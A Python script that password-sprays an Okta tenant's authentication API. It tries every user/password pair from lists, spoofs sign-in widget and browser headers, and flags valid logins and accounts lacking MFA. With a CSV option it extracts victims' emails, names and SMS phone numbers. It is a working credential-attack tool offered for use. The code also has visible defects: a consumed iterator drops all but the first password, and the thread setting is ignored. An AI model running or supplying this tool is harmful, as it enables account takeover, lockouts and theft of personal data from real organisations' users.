#!/usr/bin/python3

import requests
from concurrent.futures import ThreadPoolExecutor
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("subdomain", help="The subdomain of okta.com to attempt the spray upon.")
parser.add_argument("userList", help="The newline delimited list of users to password spray")
parser.add_argument("passList", help="The newline delimited list of passwords to spray.")
parser.add_argument("--threads", help="Number of threads. Default: 7", default=7, type=int)
parser.add_argument("--csv", help="Change the output to CSV format", action='store_true')
args = parser.parse_args()

subdomain = args.subdomain.replace(".okta.com", "")

def checkCreds(creds):
    username, password = creds
    session = requests.Session()
    rawBody = "{\"username\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"password\":\"%s\"}" % (username, password)
    headers = {"Accept":"application/json","X-Requested-With":"XMLHttpRequest","X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0","Accept-Encoding":"gzip, deflate","Accept-Language":"en","Content-Type":"application/json"}
    response = session.post("https://%s.okta.com/api/v1/authn"%subdomain, data=rawBody, headers=headers)
    print(response.json())
    print("creds: "+username+" "+password)
    if response.status_code == 200 and 'status' in response.json():
        jsonData = response.json()
        if "LOCKED_OUT" == jsonData['status']:
            print ("Account locked out! %s:%s"%(username, password))
        elif "MFA_ENROLL" == jsonData['status']:
            if args.csv:
                email = jsonData['_embedded']['user']['profile']['login']
                fName = jsonData['_embedded']['user']['profile']['firstName']
                lName = jsonData['_embedded']['user']['profile']['lastName']
                phone = "N/A"
                if 'factors' in jsonData['_embedded']:
                    for item in jsonData['_embedded']['factors']:
                        if "factorType" in item.keys() and item['factorType']=='sms':
                            phone = item['profile']['phoneNumber']
                print (", ".join([username, password,email, fName, lName, phone]))
            else:
                print ("Valid Credentials without MFA! %s:%s"%(username, password))
        else:
            if args.csv:
                email = jsonData['_embedded']['user']['profile']['login']
                fName = jsonData['_embedded']['user']['profile']['firstName']
                lName = jsonData['_embedded']['user']['profile']['lastName']
                phone = "N/A"
                if 'factors' in jsonData['_embedded']:
                    for item in jsonData['_embedded']['factors']:
                        if "factorType" in item.keys() and item['factorType']=='sms':
                            phone = item['profile']['phoneNumber']
                print (", ".join([username, password,email, fName, lName, phone]))
            else:
                print ("Valid Credentials! %s:%s"%(username, password))

uL=open(args.userList)
users = map(str.strip, uL.readlines())
uL.close()

pL=open(args.passList)
passwords = map(str.strip, pL.readlines())
pL.close()

combo = []
for password in passwords:
    for user in users:
        combo.append([user, password])


del users
del passwords

def oSpray(tasks,max_workers):
        with ThreadPoolExecutor(max_workers=max_workers) as executor: 
            running_tasks = [executor.submit(task) for task in tasks]
            for running_task in running_tasks:
                running_task.result()

tasks = [lambda i=i: checkCreds(i) for i in combo]

oSpray(tasks, len(tasks))